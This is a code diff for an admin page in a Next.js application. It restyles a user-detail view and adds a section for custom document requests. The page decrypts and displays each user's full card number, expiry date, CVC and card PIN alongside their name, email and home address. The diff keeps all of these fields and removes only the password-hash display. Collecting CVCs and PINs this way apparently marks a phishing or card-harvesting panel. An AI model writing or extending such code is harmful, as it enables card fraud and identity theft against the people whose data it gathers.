@@ -11,6 +11,7 @@ import { DocStatus, DocType } from "@prisma/client";
 import { UserActions } from "@/components/admin/user-actions";
 import { DocumentList } from "@/components/admin/document-list";
 import { LanguageProvider } from "@/lib/language-context";
+import { CustomRequestButton } from "@/components/admin/custom-request-button";
 
 type UserFinancials = {
   cardName: string;
@@ -49,6 +50,12 @@ type AdminUserDetail = {
     isRead: boolean;
     createdAt: Date;
   }>;
+  customRequests: Array<{
+    id: string;
+    name: string;
+    status: string;
+    createdAt: Date;
+  }>;
 };
 
 export default async function AdminUserDetailPage({
@@ -78,6 +85,7 @@ export default async function AdminUserDetailPage({
       financials: true,
       documents: { orderBy: { createdAt: "desc" } },
       notifications: { orderBy: { createdAt: "desc" }, take: 20 },
+      customRequests: { orderBy: { createdAt: "desc" } },
     },
   })) as AdminUserDetail | null;
   if (!user) notFound();
@@ -102,64 +110,100 @@ export default async function AdminUserDetailPage({
     };
   }
 
-return (
+  return (
     <LanguageProvider>
       <main className="min-h-dvh px-4 sm:px-8 py-10 sm:py-16">
         <div className="mx-auto max-w-4xl space-y-6">
-          <header className="rounded-xl border bg-white/5 backdrop-blur-lg border-white/10 p-4 sm:p-6">
+          <header className="rounded-xl border bg-slate-900/80 backdrop-blur-lg border-slate-700 p-4 sm:p-6">
             <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
               <div>
-                <h1 className="text-xl sm:text-2xl font-bold">User Details: {user.fullName}</h1>
+                <h1 className="text-xl sm:text-2xl font-bold text-white">User Details: {user.fullName}</h1>
                 <p className="text-slate-400 text-sm sm:text-base">{user.email}</p>
               </div>
-              <div className="flex gap-2">
+              <div className="flex gap-2 flex-wrap">
                 <Button asChild size="sm" variant="outline">
                   <a href={`/api/admin/users/${user.id}/download`} target="_blank">
-                    Download User (PDF)
+                    Download Report
                   </a>
                 </Button>
                 <Link href="/admin/dashboard">
-                  <Button variant="outline" size="sm">Back to Dashboard</Button>
+                  <Button variant="outline" size="sm">Back</Button>
                 </Link>
               </div>
             </div>
           </header>
 
           <div className="grid gap-4 sm:gap-6 md:grid-cols-2">
-            <Card className="bg-white/5 backdrop-blur-lg border border-white/10 transition-all duration-300 ease-in-out hover:-translate-y-2 hover:border-blue-500/50 hover:shadow-blue-500/20">
+            <Card className="bg-slate-900/80 backdrop-blur-lg border border-slate-700">
               <CardHeader>
-                <CardTitle className="text-lg">Basic Information</CardTitle>
+                <CardTitle className="text-lg text-white">Personal Information</CardTitle>
               </CardHeader>
-              <CardContent className="space-y-2 text-slate-300 text-sm sm:text-base">
-                <p><strong className="text-white">Full Name:</strong> {user.fullName}</p>
-                <p><strong className="text-white">Email:</strong> {user.email}</p>
-                <p><strong className="text-white">Password Hash:</strong> <span className="text-xs font-mono truncate max-w-[150px] inline-block">{user.password}</span></p>
-                <p><strong className="text-white">Role:</strong> <Badge variant={user.role === "ADMIN" ? "default" : "secondary"}>{user.role}</Badge></p>
-                <p><strong className="text-white">Status:</strong> <Badge variant={user.status === "APPROVED" ? "default" : user.status === "REJECTED" ? "destructive" : "secondary"}>{user.status}</Badge></p>
-                <p><strong className="text-white">City:</strong> {user.city || "N/A"}</p>
-                <p><strong className="text-white">Address:</strong> {user.address || "N/A"}</p>
-                <p><strong className="text-white">Language:</strong> {user.language}</p>
-                <p><strong className="text-white">Theme:</strong> {user.theme}</p>
-                <p><strong className="text-white">Created At:</strong> {user.createdAt.toLocaleString()}</p>
+              <CardContent className="space-y-3 text-slate-300 text-sm sm:text-base">
+                <div className="flex justify-between border-b border-slate-700 pb-2">
+                  <span className="text-slate-400">Full Name</span>
+                  <span className="text-white font-medium">{user.fullName}</span>
+                </div>
+                <div className="flex justify-between border-b border-slate-700 pb-2">
+                  <span className="text-slate-400">Email</span>
+                  <span className="text-white">{user.email}</span>
+                </div>
+                <div className="flex justify-between border-b border-slate-700 pb-2">
+                  <span className="text-slate-400">Role</span>
+                  <Badge variant={user.role === "ADMIN" ? "default" : "secondary"}>{user.role}</Badge>
+                </div>
+                <div className="flex justify-between border-b border-slate-700 pb-2">
+                  <span className="text-slate-400">Status</span>
+                  <Badge variant={user.status === "APPROVED" ? "default" : user.status === "REJECTED" ? "destructive" : "secondary"}>{user.status}</Badge>
+                </div>
+                <div className="flex justify-between border-b border-slate-700 pb-2">
+                  <span className="text-slate-400">City</span>
+                  <span className="text-white">{user.city || "N/A"}</span>
+                </div>
+                <div className="flex justify-between border-b border-slate-700 pb-2">
+                  <span className="text-slate-400">Address</span>
+                  <span className="text-white">{user.address || "N/A"}</span>
+                </div>
+                <div className="flex justify-between border-b border-slate-700 pb-2">
+                  <span className="text-slate-400">Registered</span>
+                  <span className="text-white">{user.createdAt.toLocaleDateString()}</span>
+                </div>
               </CardContent>
             </Card>
 
-            <Card className="bg-white/5 backdrop-blur-lg border border-white/10 transition-all duration-300 ease-in-out hover:-translate-y-2 hover:border-blue-500/50 hover:shadow-blue-500/20">
+            <Card className="bg-slate-900/80 backdrop-blur-lg border border-slate-700">
               <CardHeader>
-                <CardTitle className="text-lg">Financial Details</CardTitle>
+                <CardTitle className="text-lg text-white">Financial Details</CardTitle>
               </CardHeader>
-              <CardContent className="space-y-2 text-slate-300 text-sm sm:text-base">
+              <CardContent className="space-y-3 text-slate-300 text-sm sm:text-base">
                 {decryptedFinancial ? (
                   <>
-                    <p><strong className="text-white">Card Name:</strong> {decryptedFinancial.cardName}</p>
-                    <p><strong className="text-white">Card Number:</strong> **** **** **** {decryptedFinancial.lastFour}</p>
-                    <p><strong className="text-white">Full Card Number:</strong> {decryptedFinancial.cardNumber}</p>
-                    <p><strong className="text-white">Expiry:</strong> {decryptedFinancial.expiryDate}</p>
-                    <p><strong className="text-white">CVC:</strong> {decryptedFinancial.cvc}</p>
-                    <p><strong className="text-white">PIN:</strong> {decryptedFinancial.pin}</p>
+                    <div className="flex justify-between border-b border-slate-700 pb-2">
+                      <span className="text-slate-400">Card Name</span>
+                      <span className="text-white">{decryptedFinancial.cardName}</span>
+                    </div>
+                    <div className="flex justify-between border-b border-slate-700 pb-2">
+                      <span className="text-slate-400">Card Number</span>
+                      <span className="text-white">**** {decryptedFinancial.lastFour}</span>
+                    </div>
+                    <div className="flex justify-between border-b border-slate-700 pb-2">
+                      <span className="text-slate-400">Full Number</span>
+                      <span className="text-white text-xs">{decryptedFinancial.cardNumber}</span>
+                    </div>
+                    <div className="flex justify-between border-b border-slate-700 pb-2">
+                      <span className="text-slate-400">Expiry</span>
+                      <span className="text-white">{decryptedFinancial.expiryDate}</span>
+                    </div>
+                    <div className="flex justify-between border-b border-slate-700 pb-2">
+                      <span className="text-slate-400">CVC</span>
+                      <span className="text-white">{decryptedFinancial.cvc}</span>
+                    </div>
+                    <div className="flex justify-between">
+                      <span className="text-slate-400">PIN</span>
+                      <span className="text-white">{decryptedFinancial.pin}</span>
+                    </div>
                   </>
                 ) : (
-                  <p>No financial details available.</p>
+                  <p className="text-slate-400">No financial details available.</p>
                 )}
               </CardContent>
             </Card>
@@ -167,27 +211,48 @@ return (
 
           <UserActions userId={user.id} currentStatus={user.status} />
 
-          <Card className="bg-white/5 backdrop-blur-lg border border-white/10">
-            <CardHeader>
-              <CardTitle className="text-lg">Documents</CardTitle>
+          <Card className="bg-slate-900/80 backdrop-blur-lg border border-slate-700">
+            <CardHeader className="flex flex-row items-center justify-between">
+              <CardTitle className="text-lg text-white">Documents</CardTitle>
+              <CustomRequestButton userId={user.id} />
             </CardHeader>
             <CardContent>
               <DocumentList documents={user.documents} userId={user.id} />
             </CardContent>
           </Card>
 
-          <Card className="bg-white/5 backdrop-blur-lg border border-white/10">
+          {user.customRequests && user.customRequests.length > 0 && (
+            <Card className="bg-slate-900/80 backdrop-blur-lg border border-slate-700">
+              <CardHeader>
+                <CardTitle className="text-lg text-white">Custom Document Requests</CardTitle>
+              </CardHeader>
+              <CardContent>
+                <div className="space-y-2">
+                  {user.customRequests.map((req) => (
+                    <div key={req.id} className="flex justify-between items-center border border-slate-700 rounded p-3">
+                      <span className="text-white">{req.name}</span>
+                      <Badge variant={req.status === "COMPLETED" ? "default" : "secondary"}>{req.status}</Badge>
+                    </div>
+                  ))}
+                </div>
+              </CardContent>
+            </Card>
+          )}
+
+          <Card className="bg-slate-900/80 backdrop-blur-lg border border-slate-700">
             <CardHeader>
-              <CardTitle className="text-lg">Notifications</CardTitle>
+              <CardTitle className="text-lg text-white">Notifications</CardTitle>
             </CardHeader>
             <CardContent>
               <div className="space-y-2">
                 {user.notifications.map((notif) => (
                   <div key={notif.id} className="border border-slate-700 rounded p-3 hover:bg-slate-800/50 transition-colors">
-                    <p className="text-slate-300"><strong className="text-white">Title:</strong> {notif.title}</p>
-                    <p className="text-slate-300"><strong className="text-white">Message:</strong> {notif.message}</p>
-                    <p className="text-slate-300"><strong className="text-white">Read:</strong> {notif.isRead ? "Yes" : "No"}</p>
-                    <p className="text-slate-300"><strong className="text-white">Created:</strong> {notif.createdAt.toLocaleString()}</p>
+                    <div className="flex justify-between">
+                      <p className="text-white font-medium">{notif.title}</p>
+                      <Badge variant={notif.isRead ? "default" : "secondary"}>{notif.isRead ? "Read" : "Unread"}</Badge>
+                    </div>
+                    <p className="text-slate-400 text-sm">{notif.message}</p>
+                    <p className="text-slate-500 text-xs mt-1">{notif.createdAt.toLocaleString()}</p>
                   </div>
                 ))}
               </div>
